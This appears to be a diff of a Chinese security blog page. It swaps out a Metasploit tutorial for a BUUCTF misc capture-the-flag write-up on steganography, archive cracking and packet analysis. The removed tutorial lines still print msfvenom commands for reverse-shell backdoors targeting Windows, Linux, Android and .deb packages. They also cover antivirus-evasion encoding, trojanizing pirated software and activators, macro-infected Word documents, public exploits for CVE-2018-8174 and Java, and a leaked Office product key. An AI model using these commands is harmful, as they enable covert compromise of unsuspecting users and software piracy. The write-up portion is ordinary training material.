@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="metasploit教程, 信安小白 web安全 CTF southerose">
+    <meta name="keywords" content="buuctf-misc-wp, 信安小白 web安全 CTF southerose">
     <meta name="description" content="信安小白 | web安全 | CTF">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>metasploit教程 | southerose&#39;s Blog</title>
+    <title>buuctf-misc-wp | southerose&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -247,12 +247,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20210411184653.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20210620102558.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">metasploit教程</h1>
+                    <h1 class="description center-align post-title">buuctf-misc-wp</h1>
                 </div>
             </div>
         </div>
@@ -366,9 +366,21 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/buuctf/">
+                                <span class="chip bg-color">buuctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                            <a href="/tags/misc/">
+                                <span class="chip bg-color">misc</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -376,8 +388,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
-                                工具
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
                             </a>
                         
                     </div>
@@ -389,7 +401,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-11
+                    2021-06-20
                 </div>
                 
 
@@ -403,14 +415,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    5 分
                 </div>
                 
 
@@ -433,254 +445,227 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <blockquote>
-<p>声明：以下内容仅限于在本地测试，不可用于违法行为，参阅本博客所造成的一切后果，本人概不负责。</p>
-</blockquote>
-<h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411182602.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411182605.png"></p>
-<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><blockquote>
-<p>常用payload</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">set payload windows/meterpreter/reverse_tcp  windows系统
-set payload linux/x64/meterpreter/reverse_tcp  linux系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>搜索模块</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">search {name}
-search type:{type}
-search type:{type} name:{name}
-search platform:{name}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>使用模块</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">use {module}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>查看配置参数</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>查看对象</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">show targets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>当前模块信息</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>运行模块</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">run
-exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>其他</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">jobs 查看后台任务
-jobs -K 杀死后台所有进程
-sessions 查看会话
-sessions -i {id} 切换会话到id
-exploit -j 保持会话到后台
-back 返回上一级
-background 后台
-msfdb reinit 重置数据库
-hosts 查看缓存
-services 查看所有目标开启的服务
-services -R {ip} 查看制定主机开启的服务
-hosts -d {ip} 删除数据
-creds 列出数据库中的所有凭据
- db_export -f /root/msfbak.xml 导出数据
- db_import /home/john/Documents/export.xml 导入数据
-
-将nmap中的数据导入metasploit framework
-
-nmap -A baidu.com -oX baidu.xml 扫描结果输出到xml文件
-db_import /mytmp/baidu.xml 在msf中导入xml文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="基于TCP协议收集主机信息"><a href="#基于TCP协议收集主机信息" class="headerlink" title="基于TCP协议收集主机信息"></a>基于TCP协议收集主机信息</h2><blockquote>
-<p>实验：<br>在kali上嗅探靶机的ftp登陆账户以及密码<br>首先开启两个终端，在第一个终端中运行嗅探模块（auxiliary/sniffer/psnuffle）<br>在第二终端使用lftp登陆进靶机。（lftp -u msfadmin 192.138.36.133）</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">db_nmap #和nmap一样
-search arp_sweep #msf中的辅助模块
-search portscan #msf中的端口扫描模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="基于SNMP协议收集主机信息"><a href="#基于SNMP协议收集主机信息" class="headerlink" title="基于SNMP协议收集主机信息"></a>基于SNMP协议收集主机信息</h2><blockquote>
-<p>SNMP（简单网络管理协议）</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">search snmp_enum
-use auxiliary/scanner/snmp/snmp_enum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="基于SMB协议收集信息"><a href="#基于SMB协议收集信息" class="headerlink" title="基于SMB协议收集信息"></a>基于SMB协议收集信息</h2><blockquote>
-<p>SMB（服务器消息块），又称网络文件共享系统（CIFS）</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">查看smb版本
-search smb_version
-use auxiliary/scanner/smb/smb_version 
-
-查看目标的共享文件
-search smb_enumshares
-use auxiliary/scanner/smb/smb_enumshares
-
-扫描用户以及id
-search smb_lookupsid
-use auxiliary/scanner/smb/smb_lookupsid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="基于SSH协议收集信息"><a href="#基于SSH协议收集信息" class="headerlink" title="基于SSH协议收集信息"></a>基于SSH协议收集信息</h2><pre class="line-numbers language-none"><code class="language-none">扫描ssh信息
-search ssh_version
-use auxiliary/scanner/ssh/ssh_version 
-
-暴力破解ssh登录名和密码
-search ssh_login
-use auxiliary/scanner/ssh/ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="基于FTP协议收集信息"><a href="#基于FTP协议收集信息" class="headerlink" title="基于FTP协议收集信息"></a>基于FTP协议收集信息</h2><pre class="line-numbers language-none"><code class="language-none">扫描ftp服务
-search ftp_version
-use auxiliary/scanner/ftp/ftp_version
-扫描出来的结果是：vsFTPd 2.3.4\
-
-搜索与vsFTPd 2.3.4相关的漏洞
-search VSFTPD v2.3.4
-use exploit/unix/ftp/vsftpd_234_backdoor
-
-扫描ftp是否可以匿名登陆
-search name:anonymous
-use auxiliary/scanner/ftp/anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="制作winddows恶意软件来获取shell"><a href="#制作winddows恶意软件来获取shell" class="headerlink" title="制作winddows恶意软件来获取shell"></a>制作winddows恶意软件来获取shell</h2><blockquote>
-<p>生成.exe 后门程序</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' lhost=192.168.36.128 lport=6667 -f exe &gt; rose4.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>使用一个编码器</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6666 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/rose1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<blockquote>
-<p>使用两个编码器组合编码</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6666 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f exe -o /var/www/html/rose2.exe
-
-打开msf，启动后门监听模块
-use exploit/multi/handler
-
-查看meterpreter的所以命令    help
-实时监控屏幕 run vnc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="在正常软件中植入木马"><a href="#在正常软件中植入木马" class="headerlink" title="在正常软件中植入木马"></a>在正常软件中植入木马</h2><pre class="line-numbers language-none"><code class="language-none">例如：windows激活工具，私服客户端，盗版游戏，彩票，抢红包软件，PS激活工具，CRT激活工具，注册机。。。
-
-tips: 先查看主程序会调用哪些附加的小程序，然后把payload后门和这些小程序绑定到一起。当然也可以直接加到主程序上，但是加主程序上，有时报错。-
-
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6667 -b"\x00" -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="使用模块生成反杀毒软件的木马"><a href="#使用模块生成反杀毒软件的木马" class="headerlink" title="使用模块生成反杀毒软件的木马"></a>使用模块生成反杀毒软件的木马</h2><pre class="line-numbers language-none"><code class="language-none">search evasion
-use evasion/windows/windows_defender_exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="制作-Linux-恶意软件获取-shell"><a href="#制作-Linux-恶意软件获取-shell" class="headerlink" title="制作 Linux 恶意软件获取 shell"></a>制作 Linux 恶意软件获取 shell</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6667 -b "\x00" -i 10 -f elf -o /var/www/html/souther
-
-打开msf，启动后门监听模块
-use exploit/multi/handler
-
-设置payload后门
-set linux/x64/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="制作恶意deb软件包来触发后门"><a href="#制作恶意deb软件包来触发后门" class="headerlink" title="制作恶意deb软件包来触发后门"></a>制作恶意deb软件包来触发后门</h2><pre class="line-numbers language-none"><code class="language-none">apt --download-only install freesweep      #仅下载 
-dpkg -x {name} {目录}      #解压文件
-
-生成后门
-msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.1.128 LPORT=6667 -b "\x00" -i 10 -f elf -o /mytmp/free/usr/games/freesweep_sources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="利用0DAY漏洞获取shell"><a href="#利用0DAY漏洞获取shell" class="headerlink" title="利用0DAY漏洞获取shell"></a>利用0DAY漏洞获取shell</h2><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git
-
-python CVE-2018-8174.py -u http://192.168.36.128/exploit.html -o hack.rtf -i 192.168.36.128 -p 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="基于java-环境的漏洞利用获取shell"><a href="#基于java-环境的漏洞利用获取shell" class="headerlink" title="基于java 环境的漏洞利用获取shell"></a>基于java 环境的漏洞利用获取shell</h2><pre class="line-numbers language-none"><code class="language-none">第一步我们先安装 java 环境上传 jre 到 win7 或 xp 操作系统
-
-use	exploit/multi/browser/java_jre17_driver_manager
-
-show options
-show payloads #查看此 java模块可以使用的 payloads
-
-msf5 exploit(multi/browser/java_jre17_driver_manager) &gt;
-msf5 exploit(multi/browser/java_jre17_driver_manager) &gt; set LHOST 192.168.1.53
-msf5 exploit(multi/browser/java_jre17_driver_manager) &gt; jobs -K
-msf5 exploit(multi/browser/java_jre17_driver_manager) &gt; exploit
-在 win7 上安装 java 环境
-win7 主机访问 http://192.168.1.53:8080/bUry5GxBnxluT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="利用宏感染-word-文档获取-shell"><a href="#利用宏感染-word-文档获取-shell" class="headerlink" title="利用宏感染 word 文档获取 shell"></a>利用宏感染 word 文档获取 shell</h2><pre class="line-numbers language-none"><code class="language-none">首先将 cn_office_professional_plus_2007_dvd_X12-38713.rar 上传到 win7 虚拟上，解压后，安装一下 office。office 的激活码: DBXYD-TF477-46YM4-W74MH-6YDQ8
-
-msfvenom -a x86 --platform windows -p
-windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe
-
-msf5 exploit(multi/browser/java_jre17_driver_manager) &gt; use exploit/multi/handler
-msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) &gt; set LHOST 192.168.1.53
-msf5 exploit(multi/handler) &gt; jobs -K
-msf5 exploit(multi/handler) &gt; exploit
-2、配置好侦听之后我们打开我们制作的 word 文档，文档一旦打开就会执行 payload 连接到 MSF，
-关闭 word 文档之后 session 不受影响。
-允许运行宏：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="安卓客户端渗透"><a href="#安卓客户端渗透" class="headerlink" title="安卓客户端渗透"></a>安卓客户端渗透</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.36.128 LPORT=4444 R &gt; rose.apk
-msf5 &gt; use exploit/multi/handler
-msf5 exploit(multi/handler) &gt; set PAYLOAD android/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) &gt; set lhost 192.168.1.53
-msf5 exploit(multi/handler) &gt; set lport 4444
-msf5 exploit(multi/handler) &gt; run
-手机端点击打开 APK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+                <h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620092922.png"></p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>无</li>
+</ul>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>点开即得到flag</p>
+<h1 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620092941.png"></p>
+<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>利用工具stegsolve的Frame Browser可以查看gif图片的每一帧</li>
+</ul>
+<h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>下载附件得到，aaa.gif</p>
+<p>下载工具stegsolve</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616155159.png"></p>
+<p>使用工具的FrameBrowser可以查看gif的每一帧</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616155327.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616155345.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616155402.png"></p>
+<p>flag{he11ohongke}</p>
+<h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620092950.png"></p>
+<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>binwalk分离并提取文件</li>
+<li>ziperello破解四位纯数字密码</li>
+</ul>
+<h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p>打开附件是一个二维码图片QR_code.png，用软件扫描之后没有得到flag，先用binwalk分析并提取</p>
+<pre class="line-numbers language-none"><code class="language-none">binwalk -e QR_code.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后进入提取后得到的目录</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616162035.png"></p>
+<p><img src="C:/Users/Polaris/AppData/Roaming/Typora/typora-user-images/image-20210616162111427.png" alt="image-20210616162111427"></p>
+<p>尝试使用工具Ziperello来爆破1D7.zip</p>
+<p>爆破成功，密码7639</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616162142.png"></p>
+<p>解压文件打开4number.txt得到flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616162322.png"></p>
+<h1 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620092957.png"></p>
+<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>使用普通编辑器打开文件，查看隐藏内容</li>
+<li>利用html的img标签还原解码后的内容</li>
+</ul>
+<h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><p>下载附件是一个KEY.exe文件，无法打开，尝试使用notepad++打开，发现一大串字符</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616163041.png"></p>
+<p>从这个位置开始，复制到网站上解码<a target="_blank" rel="noopener" href="https://the-x.cn/base64/">https://the-x.cn/base64/</a></p>
+<p>发现是一个png的图片</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616163136.png"></p>
+<p>然后我们发现他是个png的文件，得想办法还原成png文件</p>
+<p>写个html的文件，里面加入img标签，将img标签中的src属性改为刚刚得到的整个字符内容</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;img src="替换内容"&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后得到一个二维码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616163639.png"></p>
+<p>扫描得到flag{dca57f966e4e4e31fd5b15417da63269}</p>
+<h1 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093004.png"></p>
+<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>使用普通编辑器，并在其中搜索字符串</li>
+</ul>
+<h2 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h2><p>下载后是biubiu.jpg，直接notepad++打开后搜索flag即可得到flag</p>
+<p>flag{stego_is_s0_bor1ing}</p>
+<h1 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093014.png"></p>
+<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><p>由图片缺失联想到图片修改图片的二进制内容</p>
+</li>
+<li><p>利用HxD二进制查看工具修改对应图片的长或者宽度</p>
+</li>
+</ul>
+<h2 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616171528.png"></p>
+<p>打开图片发现，下半部分被截掉了，得想办法恢复，打开Hxd</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616173229.png"></p>
+<p>修改下长度，保存查看即可查看flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210616173317.png"></p>
+<p>flag{He1l0_d4_ba1}</p>
+<h1 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093020.png"></p>
+<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>.rar文件被加密，使用archpr破解密码</li>
+</ul>
+<h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p>打开附件然后解压之后得到一个.rar文件，这里使用一个工具叫archpr，然后题目提示密码长度为4为数字</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617175158.png"></p>
+<p>打开压缩包，</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617175606.png"></p>
+<p>发现一个base64的密码，解码得到flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617175726.png"></p>
+<h1 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093028.png"></p>
+<h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>普通编辑器打开文件，并搜索字符串</li>
+</ul>
+<h2 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h2><p>notepad++打开图片，搜索得到flag</p>
+<h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093147.png"></p>
+<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>使用stegsolve分析图片通道</li>
+<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016223897">LSB隐写</a></li>
+</ul>
+<h2 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h2><p>打开文件是一张图片，binwalk没有得到什么信息，然后放到stegsolve，分析通道，发现Red plane 0<code>、</code>Grenn plane 0<code>、</code>Blue plane0上方有东西</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617182804.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617182834.png"></p>
+<p>然后保存名称为flag.png</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617182910.png"></p>
+<p>得到一个二维码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617182945.png"></p>
+<h1 id="文件中秘密"><a href="#文件中秘密" class="headerlink" title="文件中秘密"></a>文件中秘密</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093157.png"></p>
+<h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>发现图片属于中的隐藏信息</li>
+</ul>
+<h2 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h2><p>解压附件得到一张图片，属性里面得到flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617201627.png"></p>
+<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093204.png"></p>
+<h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>wireshark抓包分析</li>
+<li>wireshark分组字节流中搜索字符串</li>
+</ul>
+<h2 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h2><p>打开是个.pcap的流量包</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617202635.png"></p>
+<p>直接搜索flag，组合emai和password即可得到flag</p>
+<h1 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093211.png"></p>
+<h2 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>.rar文件使用archpr破解密码</li>
+</ul>
+<h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p>解压附件，得到一个被加密了的.rar的压缩包，想办法破解，题目提示是四位密码，使用工具archpr</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617203342.png"></p>
+<p>得到密码后，打开文件得到flag</p>
+<h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093218.png"></p>
+<h2 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>工具QR Research的使用</li>
+</ul>
+<h2 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h2><p>使用QR Research得到flag</p>
+<h1 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093225.png"></p>
+<h2 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26187985/article/details/83654197">zip伪加密</a></li>
+</ul>
+<h2 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h2><p>.zip文件被加密了，查询资料，给出两张图</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617205233.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617205335.png"></p>
+<p>再看本题</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210617205900.png"></p>
+<p>在标记处将09改成00，保存后解压得到flag</p>
+<h1 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093232.png"></p>
+<h2 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>binwalk分析文件</li>
+<li>foremost提权文件</li>
+<li>ziperello破解文件密码</li>
+</ul>
+<h2 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h2><p>打开附件仍然是一张图片，binwalk分析发现zip文件，foremost分离，发现.zip压缩文件被加密了，直接放到ziperello中暴力破解四位数字密码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210618152402.png"></p>
+<h1 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093240.png"></p>
+<h2 id="知识点-15"><a href="#知识点-15" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>stegsolve分析图片通道</li>
+<li>stegsolve=&gt;Date Extract提取对应通道内容</li>
+<li></li>
+</ul>
+<h2 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h2><p>red plane 0、green plane 0、blue plane 0通道被黑色遮挡，data extract</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210618154456.png"></p>
+<p>发现flag</p>
+<h1 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h1><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620093247.png"></p>
+<h2 id="知识点-16"><a href="#知识点-16" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>wireshark中在分组字节流中搜索对于字符串</li>
+</ul>
+<h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p>打开流量包直接搜索得到flag</p>
